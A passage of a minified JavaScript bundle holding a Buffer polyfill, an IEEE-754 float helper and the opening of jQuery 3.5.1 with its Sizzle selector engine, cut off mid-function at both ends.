        function F(e, t, n, r, o) {
          return o || L(e, 0, n, 8), i.write(e, t, n, r, 52, 8), n + 8;
        }
        s.prototype.slice = function (e, t) {
          var n,
            r = this.length;
          if ((e = ~~e) < 0 ? (e += r) < 0 && (e = 0) : e > r && (e = r), (t = void 0 === t ? r : ~~t) < 0 ? (t += r) < 0 && (t = 0) : t > r && (t = r), t < e && (t = e), s.TYPED_ARRAY_SUPPORT) (n = this.subarray(e, t)).__proto__ = s.prototype;else {
            var i = t - e;
            n = new s(i, void 0);
            for (var o = 0; o < i; ++o) n[o] = this[o + e];
          }
          return n;
        }, s.prototype.readUIntLE = function (e, t, n) {
          e |= 0, t |= 0, n || O(e, t, this.length);
          for (var r = this[e], i = 1, o = 0; ++o < t && (i *= 256);) r += this[e + o] * i;
          return r;
        }, s.prototype.readUIntBE = function (e, t, n) {
          e |= 0, t |= 0, n || O(e, t, this.length);
          for (var r = this[e + --t], i = 1; t > 0 && (i *= 256);) r += this[e + --t] * i;
          return r;
        }, s.prototype.readUInt8 = function (e, t) {
          return t || O(e, 1, this.length), this[e];
        }, s.prototype.readUInt16LE = function (e, t) {
          return t || O(e, 2, this.length), this[e] | this[e + 1] << 8;
        }, s.prototype.readUInt16BE = function (e, t) {
          return t || O(e, 2, this.length), this[e] << 8 | this[e + 1];
        }, s.prototype.readUInt32LE = function (e, t) {
          return t || O(e, 4, this.length), (this[e] | this[e + 1] << 8 | this[e + 2] << 16) + 16777216 * this[e + 3];
        }, s.prototype.readUInt32BE = function (e, t) {
          return t || O(e, 4, this.length), 16777216 * this[e] + (this[e + 1] << 16 | this[e + 2] << 8 | this[e + 3]);
        }, s.prototype.readIntLE = function (e, t, n) {
          e |= 0, t |= 0, n || O(e, t, this.length);
          for (var r = this[e], i = 1, o = 0; ++o < t && (i *= 256);) r += this[e + o] * i;
          return r >= (i *= 128) && (r -= Math.pow(2, 8 * t)), r;
        }, s.prototype.readIntBE = function (e, t, n) {
          e |= 0, t |= 0, n || O(e, t, this.length);
          for (var r = t, i = 1, o = this[e + --r]; r > 0 && (i *= 256);) o += this[e + --r] * i;
          return o >= (i *= 128) && (o -= Math.pow(2, 8 * t)), o;
        }, s.prototype.readInt8 = function (e, t) {
          return t || O(e, 1, this.length), 128 & this[e] ? -1 * (255 - this[e] + 1) : this[e];
        }, s.prototype.readInt16LE = function (e, t) {
          t || O(e, 2, this.length);
          var n = this[e] | this[e + 1] << 8;
          return 32768 & n ? 4294901760 | n : n;
        }, s.prototype.readInt16BE = function (e, t) {
          t || O(e, 2, this.length);
          var n = this[e + 1] | this[e] << 8;
          return 32768 & n ? 4294901760 | n : n;
        }, s.prototype.readInt32LE = function (e, t) {
          return t || O(e, 4, this.length), this[e] | this[e + 1] << 8 | this[e + 2] << 16 | this[e + 3] << 24;
        }, s.prototype.readInt32BE = function (e, t) {
          return t || O(e, 4, this.length), this[e] << 24 | this[e + 1] << 16 | this[e + 2] << 8 | this[e + 3];
        }, s.prototype.readFloatLE = function (e, t) {
          return t || O(e, 4, this.length), i.read(this, e, !0, 23, 4);
        }, s.prototype.readFloatBE = function (e, t) {
          return t || O(e, 4, this.length), i.read(this, e, !1, 23, 4);
        }, s.prototype.readDoubleLE = function (e, t) {
          return t || O(e, 8, this.length), i.read(this, e, !0, 52, 8);
        }, s.prototype.readDoubleBE = function (e, t) {
          return t || O(e, 8, this.length), i.read(this, e, !1, 52, 8);
        }, s.prototype.writeUIntLE = function (e, t, n, r) {
          (e = +e, t |= 0, n |= 0, r) || j(this, e, t, n, Math.pow(2, 8 * n) - 1, 0);
          var i = 1,
            o = 0;
          for (this[t] = 255 & e; ++o < n && (i *= 256);) this[t + o] = e / i & 255;
          return t + n;
        }, s.prototype.writeUIntBE = function (e, t, n, r) {
          (e = +e, t |= 0, n |= 0, r) || j(this, e, t, n, Math.pow(2, 8 * n) - 1, 0);
          var i = n - 1,
            o = 1;
          for (this[t + i] = 255 & e; --i >= 0 && (o *= 256);) this[t + i] = e / o & 255;
          return t + n;
        }, s.prototype.writeUInt8 = function (e, t, n) {
          return e = +e, t |= 0, n || j(this, e, t, 1, 255, 0), s.TYPED_ARRAY_SUPPORT || (e = Math.floor(e)), this[t] = 255 & e, t + 1;
        }, s.prototype.writeUInt16LE = function (e, t, n) {
          return e = +e, t |= 0, n || j(this, e, t, 2, 65535, 0), s.TYPED_ARRAY_SUPPORT ? (this[t] = 255 & e, this[t + 1] = e >>> 8) : R(this, e, t, !0), t + 2;
        }, s.prototype.writeUInt16BE = function (e, t, n) {
          return e = +e, t |= 0, n || j(this, e, t, 2, 65535, 0), s.TYPED_ARRAY_SUPPORT ? (this[t] = e >>> 8, this[t + 1] = 255 & e) : R(this, e, t, !1), t + 2;
        }, s.prototype.writeUInt32LE = function (e, t, n) {
          return e = +e, t |= 0, n || j(this, e, t, 4, 4294967295, 0), s.TYPED_ARRAY_SUPPORT ? (this[t + 3] = e >>> 24, this[t + 2] = e >>> 16, this[t + 1] = e >>> 8, this[t] = 255 & e) : P(this, e, t, !0), t + 4;
        }, s.prototype.writeUInt32BE = function (e, t, n) {
          return e = +e, t |= 0, n || j(this, e, t, 4, 4294967295, 0), s.TYPED_ARRAY_SUPPORT ? (this[t] = e >>> 24, this[t + 1] = e >>> 16, this[t + 2] = e >>> 8, this[t + 3] = 255 & e) : P(this, e, t, !1), t + 4;
        }, s.prototype.writeIntLE = function (e, t, n, r) {
          if (e = +e, t |= 0, !r) {
            var i = Math.pow(2, 8 * n - 1);
            j(this, e, t, n, i - 1, -i);
          }
          var o = 0,
            a = 1,
            u = 0;
          for (this[t] = 255 & e; ++o < n && (a *= 256);) e < 0 && 0 === u && 0 !== this[t + o - 1] && (u = 1), this[t + o] = (e / a >> 0) - u & 255;
          return t + n;
        }, s.prototype.writeIntBE = function (e, t, n, r) {
          if (e = +e, t |= 0, !r) {
            var i = Math.pow(2, 8 * n - 1);
            j(this, e, t, n, i - 1, -i);
          }
          var o = n - 1,
            a = 1,
            u = 0;
          for (this[t + o] = 255 & e; --o >= 0 && (a *= 256);) e < 0 && 0 === u && 0 !== this[t + o + 1] && (u = 1), this[t + o] = (e / a >> 0) - u & 255;
          return t + n;
        }, s.prototype.writeInt8 = function (e, t, n) {
          return e = +e, t |= 0, n || j(this, e, t, 1, 127, -128), s.TYPED_ARRAY_SUPPORT || (e = Math.floor(e)), e < 0 && (e = 255 + e + 1), this[t] = 255 & e, t + 1;
        }, s.prototype.writeInt16LE = function (e, t, n) {
          return e = +e, t |= 0, n || j(this, e, t, 2, 32767, -32768), s.TYPED_ARRAY_SUPPORT ? (this[t] = 255 & e, this[t + 1] = e >>> 8) : R(this, e, t, !0), t + 2;
        }, s.prototype.writeInt16BE = function (e, t, n) {
          return e = +e, t |= 0, n || j(this, e, t, 2, 32767, -32768), s.TYPED_ARRAY_SUPPORT ? (this[t] = e >>> 8, this[t + 1] = 255 & e) : R(this, e, t, !1), t + 2;
        }, s.prototype.writeInt32LE = function (e, t, n) {
          return e = +e, t |= 0, n || j(this, e, t, 4, 2147483647, -2147483648), s.TYPED_ARRAY_SUPPORT ? (this[t] = 255 & e, this[t + 1] = e >>> 8, this[t + 2] = e >>> 16, this[t + 3] = e >>> 24) : P(this, e, t, !0), t + 4;
        }, s.prototype.writeInt32BE = function (e, t, n) {
          return e = +e, t |= 0, n || j(this, e, t, 4, 2147483647, -2147483648), e < 0 && (e = 4294967295 + e + 1), s.TYPED_ARRAY_SUPPORT ? (this[t] = e >>> 24, this[t + 1] = e >>> 16, this[t + 2] = e >>> 8, this[t + 3] = 255 & e) : P(this, e, t, !1), t + 4;
        }, s.prototype.writeFloatLE = function (e, t, n) {
          return I(this, e, t, !0, n);
        }, s.prototype.writeFloatBE = function (e, t, n) {
          return I(this, e, t, !1, n);
        }, s.prototype.writeDoubleLE = function (e, t, n) {
          return F(this, e, t, !0, n);
        }, s.prototype.writeDoubleBE = function (e, t, n) {
          return F(this, e, t, !1, n);
        }, s.prototype.copy = function (e, t, n, r) {
          if (n || (n = 0), r || 0 === r || (r = this.length), t >= e.length && (t = e.length), t || (t = 0), r > 0 && r < n && (r = n), r === n) return 0;
          if (0 === e.length || 0 === this.length) return 0;
          if (t < 0) throw new RangeError("targetStart out of bounds");
          if (n < 0 || n >= this.length) throw new RangeError("sourceStart out of bounds");
          if (r < 0) throw new RangeError("sourceEnd out of bounds");
          r > this.length && (r = this.length), e.length - t < r - n && (r = e.length - t + n);
          var i,
            o = r - n;
          if (this === e && n < t && t < r) for (i = o - 1; i >= 0; --i) e[i + t] = this[i + n];else if (o < 1e3 || !s.TYPED_ARRAY_SUPPORT) for (i = 0; i < o; ++i) e[i + t] = this[i + n];else Uint8Array.prototype.set.call(e, this.subarray(n, n + o), t);
          return o;
        }, s.prototype.fill = function (e, t, n, r) {
          if ("string" == typeof e) {
            if ("string" == typeof t ? (r = t, t = 0, n = this.length) : "string" == typeof n && (r = n, n = this.length), 1 === e.length) {
              var i = e.charCodeAt(0);
              i < 256 && (e = i);
            }
            if (void 0 !== r && "string" != typeof r) throw new TypeError("encoding must be a string");
            if ("string" == typeof r && !s.isEncoding(r)) throw new TypeError("Unknown encoding: " + r);
          } else "number" == typeof e && (e &= 255);
          if (t < 0 || this.length < t || this.length < n) throw new RangeError("Out of range index");
          if (n <= t) return this;
          var o;
          if (t >>>= 0, n = void 0 === n ? this.length : n >>> 0, e || (e = 0), "number" == typeof e) for (o = t; o < n; ++o) this[o] = e;else {
            var a = s.isBuffer(e) ? e : U(new s(e, r).toString()),
              u = a.length;
            for (o = 0; o < n - t; ++o) this[o + t] = a[o % u];
          }
          return this;
        };
        var B = /[^+\/0-9A-Za-z-_]/g;
        function M(e) {
          return e < 16 ? "0" + e.toString(16) : e.toString(16);
        }
        function U(e, t) {
          var n;
          t = t || 1 / 0;
          for (var r = e.length, i = null, o = [], a = 0; a < r; ++a) {
            if ((n = e.charCodeAt(a)) > 55295 && n < 57344) {
              if (!i) {
                if (n > 56319) {
                  (t -= 3) > -1 && o.push(239, 191, 189);
                  continue;
                }
                if (a + 1 === r) {
                  (t -= 3) > -1 && o.push(239, 191, 189);
                  continue;
                }
                i = n;
                continue;
              }
              if (n < 56320) {
                (t -= 3) > -1 && o.push(239, 191, 189), i = n;
                continue;
              }
              n = 65536 + (i - 55296 << 10 | n - 56320);
            } else i && (t -= 3) > -1 && o.push(239, 191, 189);
            if (i = null, n < 128) {
              if ((t -= 1) < 0) break;
              o.push(n);
            } else if (n < 2048) {
              if ((t -= 2) < 0) break;
              o.push(n >> 6 | 192, 63 & n | 128);
            } else if (n < 65536) {
              if ((t -= 3) < 0) break;
              o.push(n >> 12 | 224, n >> 6 & 63 | 128, 63 & n | 128);
            } else {
              if (!(n < 1114112)) throw new Error("Invalid code point");
              if ((t -= 4) < 0) break;
              o.push(n >> 18 | 240, n >> 12 & 63 | 128, n >> 6 & 63 | 128, 63 & n | 128);
            }
          }
          return o;
        }
        function q(e) {
          return r.toByteArray(function (e) {
            if ((e = function (e) {
              return e.trim ? e.trim() : e.replace(/^\s+|\s+$/g, "");
            }(e).replace(B, "")).length < 2) return "";
            for (; e.length % 4 != 0;) e += "=";
            return e;
          }(e));
        }
        function H(e, t, n, r) {
          for (var i = 0; i < r && !(i + n >= t.length || i >= e.length); ++i) t[i + n] = e[i];
          return i;
        }
      },
      7300: e => {
        var t = {}.toString;
        e.exports = Array.isArray || function (e) {
          return "[object Array]" == t.call(e);
        };
      },
      645: (e, t) => {
        t.read = function (e, t, n, r, i) {
          var o,
            a,
            u = 8 * i - r - 1,
            s = (1 << u) - 1,
            d = s >> 1,
            l = -7,
            c = n ? i - 1 : 0,
            f = n ? -1 : 1,
            h = e[t + c];
          for (c += f, o = h & (1 << -l) - 1, h >>= -l, l += u; l > 0; o = 256 * o + e[t + c], c += f, l -= 8);
          for (a = o & (1 << -l) - 1, o >>= -l, l += r; l > 0; a = 256 * a + e[t + c], c += f, l -= 8);
          if (0 === o) o = 1 - d;else {
            if (o === s) return a ? NaN : 1 / 0 * (h ? -1 : 1);
            a += Math.pow(2, r), o -= d;
          }
          return (h ? -1 : 1) * a * Math.pow(2, o - r);
        }, t.write = function (e, t, n, r, i, o) {
          var a,
            u,
            s,
            d = 8 * o - i - 1,
            l = (1 << d) - 1,
            c = l >> 1,
            f = 23 === i ? Math.pow(2, -24) - Math.pow(2, -77) : 0,
            h = r ? 0 : o - 1,
            p = r ? 1 : -1,
            m = t < 0 || 0 === t && 1 / t < 0 ? 1 : 0;
          for (t = Math.abs(t), isNaN(t) || t === 1 / 0 ? (u = isNaN(t) ? 1 : 0, a = l) : (a = Math.floor(Math.log(t) / Math.LN2), t * (s = Math.pow(2, -a)) < 1 && (a--, s *= 2), (t += a + c >= 1 ? f / s : f * Math.pow(2, 1 - c)) * s >= 2 && (a++, s /= 2), a + c >= l ? (u = 0, a = l) : a + c >= 1 ? (u = (t * s - 1) * Math.pow(2, i), a += c) : (u = t * Math.pow(2, c - 1) * Math.pow(2, i), a = 0)); i >= 8; e[n + h] = 255 & u, h += p, u /= 256, i -= 8);
          for (a = a << i | u, d += i; d > 0; e[n + h] = 255 & a, h += p, a /= 256, d -= 8);
          e[n + h - p] |= 128 * m;
        };
      },
      9755: function (e, t) {
        var n;
        !function (t, n) {
          "use strict";

          "object" == typeof e.exports ? e.exports = t.document ? n(t, !0) : function (e) {
            if (!e.document) throw new Error("jQuery requires a window with a document");
            return n(e);
          } : n(t);
        }("undefined" != typeof window ? window : this, function (r, i) {
          "use strict";

          var o = [],
            a = Object.getPrototypeOf,
            u = o.slice,
            s = o.flat ? function (e) {
              return o.flat.call(e);
            } : function (e) {
              return o.concat.apply([], e);
            },
            d = o.push,
            l = o.indexOf,
            c = {},
            f = c.toString,
            h = c.hasOwnProperty,
            p = h.toString,
            m = p.call(Object),
            g = {},
            v = function (e) {
              return "function" == typeof e && "number" != typeof e.nodeType;
            },
            y = function (e) {
              return null != e && e === e.window;
            },
            b = r.document,
            w = {
              type: !0,
              src: !0,
              nonce: !0,
              noModule: !0
            };
          function _(e, t, n) {
            var r,
              i,
              o = (n = n || b).createElement("script");
            if (o.text = e, t) for (r in w) (i = t[r] || t.getAttribute && t.getAttribute(r)) && o.setAttribute(r, i);
            n.head.appendChild(o).parentNode.removeChild(o);
          }
          function E(e) {
            return null == e ? e + "" : "object" == typeof e || "function" == typeof e ? c[f.call(e)] || "object" : typeof e;
          }
          var x = "3.5.1",
            T = function (e, t) {
              return new T.fn.init(e, t);
            };
          function C(e) {
            var t = !!e && "length" in e && e.length,
              n = E(e);
            return !v(e) && !y(e) && ("array" === n || 0 === t || "number" == typeof t && t > 0 && t - 1 in e);
          }
          T.fn = T.prototype = {
            jquery: x,
            constructor: T,
            length: 0,
            toArray: function () {
              return u.call(this);
            },
            get: function (e) {
              return null == e ? u.call(this) : e < 0 ? this[e + this.length] : this[e];
            },
            pushStack: function (e) {
              var t = T.merge(this.constructor(), e);
              return t.prevObject = this, t;
            },
            each: function (e) {
              return T.each(this, e);
            },
            map: function (e) {
              return this.pushStack(T.map(this, function (t, n) {
                return e.call(t, n, t);
              }));
            },
            slice: function () {
              return this.pushStack(u.apply(this, arguments));
            },
            first: function () {
              return this.eq(0);
            },
            last: function () {
              return this.eq(-1);
            },
            even: function () {
              return this.pushStack(T.grep(this, function (e, t) {
                return (t + 1) % 2;
              }));
            },
            odd: function () {
              return this.pushStack(T.grep(this, function (e, t) {
                return t % 2;
              }));
            },
            eq: function (e) {
              var t = this.length,
                n = +e + (e < 0 ? t : 0);
              return this.pushStack(n >= 0 && n < t ? [this[n]] : []);
            },
            end: function () {
              return this.prevObject || this.constructor();
            },
            push: d,
            sort: o.sort,
            splice: o.splice
          }, T.extend = T.fn.extend = function () {
            var e,
              t,
              n,
              r,
              i,
              o,
              a = arguments[0] || {},
              u = 1,
              s = arguments.length,
              d = !1;
            for ("boolean" == typeof a && (d = a, a = arguments[u] || {}, u++), "object" == typeof a || v(a) || (a = {}), u === s && (a = this, u--); u < s; u++) if (null != (e = arguments[u])) for (t in e) r = e[t], "__proto__" !== t && a !== r && (d && r && (T.isPlainObject(r) || (i = Array.isArray(r))) ? (n = a[t], o = i && !Array.isArray(n) ? [] : i || T.isPlainObject(n) ? n : {}, i = !1, a[t] = T.extend(d, o, r)) : void 0 !== r && (a[t] = r));
            return a;
          }, T.extend({
            expando: "jQuery" + (x + Math.random()).replace(/\D/g, ""),
            isReady: !0,
            error: function (e) {
              throw new Error(e);
            },
            noop: function () {},
            isPlainObject: function (e) {
              var t, n;
              return !(!e || "[object Object]" !== f.call(e)) && (!(t = a(e)) || "function" == typeof (n = h.call(t, "constructor") && t.constructor) && p.call(n) === m);
            },
            isEmptyObject: function (e) {
              var t;
              for (t in e) return !1;
              return !0;
            },
            globalEval: function (e, t, n) {
              _(e, {
                nonce: t && t.nonce
              }, n);
            },
            each: function (e, t) {
              var n,
                r = 0;
              if (C(e)) for (n = e.length; r < n && !1 !== t.call(e[r], r, e[r]); r++);else for (r in e) if (!1 === t.call(e[r], r, e[r])) break;
              return e;
            },
            makeArray: function (e, t) {
              var n = t || [];
              return null != e && (C(Object(e)) ? T.merge(n, "string" == typeof e ? [e] : e) : d.call(n, e)), n;
            },
            inArray: function (e, t, n) {
              return null == t ? -1 : l.call(t, e, n);
            },
            merge: function (e, t) {
              for (var n = +t.length, r = 0, i = e.length; r < n; r++) e[i++] = t[r];
              return e.length = i, e;
            },
            grep: function (e, t, n) {
              for (var r = [], i = 0, o = e.length, a = !n; i < o; i++) !t(e[i], i) !== a && r.push(e[i]);
              return r;
            },
            map: function (e, t, n) {
              var r,
                i,
                o = 0,
                a = [];
              if (C(e)) for (r = e.length; o < r; o++) null != (i = t(e[o], o, n)) && a.push(i);else for (o in e) null != (i = t(e[o], o, n)) && a.push(i);
              return s(a);
            },
            guid: 1,
            support: g
          }), "function" == typeof Symbol && (T.fn[Symbol.iterator] = o[Symbol.iterator]), T.each("Boolean Number String Function Array Date RegExp Object Error Symbol".split(" "), function (e, t) {
            c["[object " + t + "]"] = t.toLowerCase();
          });
          var S = function (e) {
            var t,
              n,
              r,
              i,
              o,
              a,
              u,
              s,
              d,
              l,
              c,
              f,
              h,
              p,
              m,
              g,
              v,
              y,
              b,
              w = "sizzle" + 1 * new Date(),
              _ = e.document,
              E = 0,
              x = 0,
              T = se(),
              C = se(),
              S = se(),
              D = se(),
              A = function (e, t) {
                return e === t && (c = !0), 0;
              },
              $ = {}.hasOwnProperty,
              k = [],
              N = k.pop,
              O = k.push,
              j = k.push,
              R = k.slice,
              P = function (e, t) {
                for (var n = 0, r = e.length; n < r; n++) if (e[n] === t) return n;
                return -1;
              },
              L = "checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",
              I = "[\\x20\\t\\r\\n\\f]",
              F = "(?:\\\\[\\da-fA-F]{1,6}" + I + "?|\\\\[^\\r\\n\\f]|[\\w-]|[^\0-\\x7f])+",
              B = "\\[" + I + "*(" + F + ")(?:" + I + "*([*^$|!~]?=)" + I + "*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|(" + F + "))|)" + I + "*\\]",
              M = ":(" + F + ")(?:\\((('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|((?:\\\\.|[^\\\\()[\\]]|" + B + ")*)|.*)\\)|)",
              U = new RegExp(I + "+", "g"),
              q = new RegExp("^" + I + "+|((?:^|[^\\\\])(?:\\\\.)*)" + I + "+$", "g"),
              H = new RegExp("^" + I + "*," + I + "*"),
              W = new RegExp("^" + I + "*([>+~]|" + I + ")" + I + "*"),
              z = new RegExp(I + "|>"),
              Y = new RegExp(M),
              V = new RegExp("^" + F + "$"),
              Q = {
                ID: new RegExp("^#(" + F + ")"),
                CLASS: new RegExp("^\\.(" + F + ")"),
                TAG: new RegExp("^(" + F + "|[*])"),
                ATTR: new RegExp("^" + B),
                PSEUDO: new RegExp("^" + M),
                CHILD: new RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\(" + I + "*(even|odd|(([+-]|)(\\d*)n|)" + I + "*(?:([+-]|)" + I + "*(\\d+)|))" + I + "*\\)|)", "i"),
                bool: new RegExp("^(?:" + L + ")$", "i"),
                needsContext: new RegExp("^" + I + "*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\(" + I + "*((?:-\\d)?\\d*)" + I + "*\\)|)(?=[^-]|$)", "i")
              },
              X = /HTML$/i,
              K = /^(?:input|select|textarea|button)$/i,
              J = /^h\d$/i,
              G = /^[^{]+\{\s*\[native \w/,
              Z = /^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,
              ee = /[+~]/,
              te = new RegExp("\\\\[\\da-fA-F]{1,6}" + I + "?|\\\\([^\\r\\n\\f])", "g"),
              ne = function (e, t) {
                var n = "0x" + e.slice(1) - 65536;
                return t || (n < 0 ? String.fromCharCode(n + 65536) : String.fromCharCode(n >> 10 | 55296, 1023 & n | 56320));
              },
              re = /([\0-\x1f\x7f]|^-?\d)|^-$|[^\0-\x1f\x7f-\uFFFF\w-]/g,
              ie = function (e, t) {
                return t ? "\0" === e ? "�" : e.slice(0, -1) + "\\" + e.charCodeAt(e.length - 1).toString(16) + " " : "\\" + e;
              },
              oe = function () {
                f();
              },
              ae = we(function (e) {
                return !0 === e.disabled && "fieldset" === e.nodeName.toLowerCase();
              }, {
                dir: "parentNode",
                next: "legend"
              });
            try {
              j.apply(k = R.call(_.childNodes), _.childNodes), k[_.childNodes.length].nodeType;
            } catch (e) {
              j = {
                apply: k.length ? function (e, t) {
                  O.apply(e, R.call(t));
                } : function (e, t) {
                  for (var n = e.length, r = 0; e[n++] = t[r++];);
                  e.length = n - 1;
                }
              };
            }
            function ue(e, t, r, i) {
              var o,
                u,
                d,
                l,
                c,
                p,
                v,
                y = t && t.ownerDocument,
                _ = t ? t.nodeType : 9;
              if (r = r || [], "string" != typeof e || !e || 1 !== _ && 9 !== _ && 11 !== _) return r;
              if (!i && (f(t), t = t || h, m)) {
                if (11 !== _ && (c = Z.exec(e))) if (o = c[1]) {
                  if (9 === _) {
                    if (!(d = t.getElementById(o))) return r;
                    if (d.id === o) return r.push(d), r;
                  } else if (y && (d = y.getElementById(o)) && b(t, d) && d.id === o) return r.push(d), r;
                } else {
                  if (c[2]) return j.apply(r, t.getElementsByTagName(e)), r;
                  if ((o = c[3]) && n.getElementsByClassName && t.getElementsByClassName) return j.apply(r, t.getElementsByClassName(o)), r;
                }
                if (n.qsa && !D[e + " "] && (!g || !g.test(e)) && (1 !== _ || "object" !== t.nodeName.toLowerCase())) {
                  if (v = e, y = t, 1 === _ && (z.test(e) || W.test(e))) {
                    for ((y = ee.test(e) && ve(t.parentNode) || t) === t && n.scope || ((l = t.getAttribute("id")) ? l = l.replace(re, ie) : t.setAttribute("id", l = w)), u = (p = a(e)).length; u--;) p[u] = (l ? "#" + l : ":scope") + " " + be(p[u]);
                    v = p.join(",");
                  }
                  try {
                    return j.apply(r, y.querySelectorAll(v)), r;
                  } catch (t) {
                    D(e, !0);
                  } finally {
                    l === w && t.removeAttribute("id");
                  }
                }
              }
              return s(e.replace(q, "$1"), t, r, i);
            }
            function se() {
              var e = [];
              return function t(n, i) {
                return e.push(n + " ") > r.cacheLength && delete t[e.shift()], t[n + " "] = i;
              };
            }
            function de(e) {
              return e[w] = !0, e;
            }
            function le(e) {
              var t = h.createElement("fieldset");
              try {
                return !!e(t);
              } catch (e) {
                return !1;
              } finally {
                t.parentNode && t.parentNode.removeChild(t), t = null;
              }
            }
            function ce(e, t) {
              for (var n = e.split("|"), i = n.length; i--;) r.attrHandle[n[i]] = t;
            }
            function fe(e, t) {
              var n = t && e,
                r = n && 1 === e.nodeType && 1 === t.nodeType && e.sourceIndex - t.sourceIndex;
              if (r) return r;
              if (n) for (; n = n.nextSibling;) if (n === t) return -1;
              return e ? 1 : -1;
            }
            function he(e) {
              return function (t) {
                return "input" === t.nodeName.toLowerCase() && t.type === e;
              };
            }
            function pe(e) {
              return function (t) {
                var n = t.nodeName.toLowerCase();
                return ("input" === n || "button" === n) && t.type === e;
              };
            }
            function me(e) {
              return function (t) {
                return "form" in t ? t.parentNode && !1 === t.disabled ? "label" in t ? "label" in t.parentNode ? t.parentNode.disabled === e : t.disabled === e : t.isDisabled === e || t.isDisabled !== !e && ae(t) === e : t.disabled === e : "label" in t && t.disabled === e;
              };
            }
            function ge(e) {
              return de(function (t) {
                return t = +t, de(function (n, r) {
                  for (var i, o = e([], n.length, t), a = o.length; a--;) n[i = o[a]] && (n[i] = !(r[i] = n[i]));
                });
              });
            }
            function ve(e) {
              return e && void 0 !== e.getElementsByTagName && e;
            }
            for (t in n = ue.support = {}, o = ue.isXML = function (e) {
              var t = e.namespaceURI,
                n = (e.ownerDocument || e).documentElement;
              return !X.test(t || n && n.nodeName || "HTML");
            }, f = ue.setDocument = function (e) {
              var t,
                i,
                a = e ? e.ownerDocument || e : _;
              return a != h && 9 === a.nodeType && a.documentElement ? (p = (h = a).documentElement, m = !o(h), _ != h && (i = h.defaultView) && i.top !== i && (i.addEventListener ? i.addEventListener("unload", oe, !1) : i.attachEvent && i.attachEvent("onunload", oe)), n.scope = le(function (e) {
                return p.appendChild(e).appendChild(h.createElement("div")), void 0 !== e.querySelectorAll && !e.querySelectorAll(":scope fieldset div").length;
              }), n.attributes = le(function (e) {
                return e.className = "i", !e.getAttribute("className");
              }), n.getElementsByTagName = le(function (e) {
                return e.appendChild(h.createComment("")), !e.getElementsByTagName("*").length;
              }), n.getElementsByClassName = G.test(h.getElementsByClassName), n.getById = le(function (e) {
                return p.appendChild(e).id = w, !h.getElementsByName || !h.getElementsByName(w).length;
              }), n.getById ? (r.filter.ID = function (e) {
                var t = e.replace(te, ne);
                return function (e) {
                  return e.getAttribute("id") === t;
                };
              }, r.find.ID = function (e, t) {
                if (void 0 !== t.getElementById && m) {
                  var n = t.getElementById(e);
                  return n ? [n] : [];
                }
              }) : (r.filter.ID = function (e) {
                var t = e.replace(te, ne);
                return function (e) {
                  var n = void 0 !== e.getAttributeNode && e.getAttributeNode("id");
                  return n && n.value === t;
                };
              }, r.find.ID = function (e, t) {
                if (void 0 !== t.getElementById && m) {
                  var n,
                    r,
                    i,
                    o = t.getElementById(e);
                  if (o) {
                    if ((n = o.getAttributeNode("id")) && n.value === e) return [o];
                    for (i = t.getElementsByName(e), r = 0; o = i[r++];) if ((n = o.getAttributeNode("id")) && n.value === e) return [o];
                  }
                  return [];
                }
              }), r.find.TAG = n.getElementsByTagName ? function (e, t) {
                return void 0 !== t.getElementsByTagName ? t.getElementsByTagName(e) : n.qsa ? t.querySelectorAll(e) : void 0;
              } : function (e, t) {
                var n,
                  r = [],
                  i = 0,
                  o = t.getElementsByTagName(e);
                if ("*" === e) {
                  for (; n = o[i++];) 1 === n.nodeType && r.push(n);
                  return r;
                }
                return o;
              }, r.find.CLASS = n.getElementsByClassName && function (e, t) {
                if (void 0 !== t.getElementsByClassName && m) return t.getElementsByClassName(e);
              }, v = [], g = [], (n.qsa = G.test(h.querySelectorAll)) && (le(function (e) {
                var t;
                p.appendChild(e).innerHTML = "<a id='" + w + "'></a><select id='" + w + "-\r\\' msallowcapture=''><option selected=''></option></select>", e.querySelectorAll("[msallowcapture^='']").length && g.push("[*^$]=" + I + "*(?:''|\"\")"), e.querySelectorAll("[selected]").length || g.push("\\[" + I + "*(?:value|" + L + ")"), e.querySelectorAll("[id~=" + w + "-]").length || g.push("~="), (t = h.createElement("input")).setAttribute("name", ""), e.appendChild(t), e.querySelectorAll("[name='']").length || g.push("\\[" + I + "*name" + I + "*=" + I + "*(?:''|\"\")"), e.querySelectorAll(":checked").length || g.push(":checked"), e.querySelectorAll("a#" + w + "+*").length || g.push(".#.+[+~]"), e.querySelectorAll("\\\f"), g.push("[\\r\\n\\f]");
              }), le(function (e) {
                e.innerHTML = "<a href='' disabled='disabled'></a><select disabled='disabled'><option/></select>";
                var t = h.createElement("input");
                t.setAttribute("type", "hidden"), e.appendChild(t).setAttribute("name", "D"), e.querySelectorAll("[name=d]").length && g.push("name" + I + "*[*^$|!~]?="), 2 !== e.querySelectorAll(":enabled").length && g.push(":enabled", ":disabled"), p.appendChild(e).disabled = !0, 2 !== e.querySelectorAll(":disabled").length && g.push(":enabled", ":disabled"), e.querySelectorAll("*,:x"), g.push(",.*:");
              })), (n.matchesSelector = G.test(y = p.matches || p.webkitMatchesSelector || p.mozMatchesSelector || p.oMatchesSelector || p.msMatchesSelector)) && le(function (e) {
                n.disconnectedMatch = y.call(e, "*"), y.call(e, "[s!='']:x"), v.push("!=", M);
              }), g = g.length && new RegExp(g.join("|")), v = v.length && new RegExp(v.join("|")), t = G.test(p.compareDocumentPosition), b = t || G.test(p.contains) ? function (e, t) {
                var n = 9 === e.nodeType ? e.documentElement : e,
                  r = t && t.parentNode;
                return e === r || !(!r || 1 !== r.nodeType || !(n.contains ? n.contains(r) : e.compareDocumentPosition && 16 & e.compareDocumentPosition(r)));
              } : function (e, t) {
                if (t) for (; t = t.parentNode;) if (t === e) return !0;
                return !1;
              }, A = t ? function (e, t) {
                if (e === t) return c = !0, 0;
                var r = !e.compareDocumentPosition - !t.compareDocumentPosition;
                return r || (1 & (r = (e.ownerDocument || e) == (t.ownerDocument || t) ? e.compareDocumentPosition(t) : 1) || !n.sortDetached && t.compareDocumentPosition(e) === r ? e == h || e.ownerDocument == _ && b(_, e) ? -1 : t == h || t.ownerDocument == _ && b(_, t) ? 1 : l ? P(l, e) - P(l, t) : 0 : 4 & r ? -1 : 1);
              } : function (e, t) {
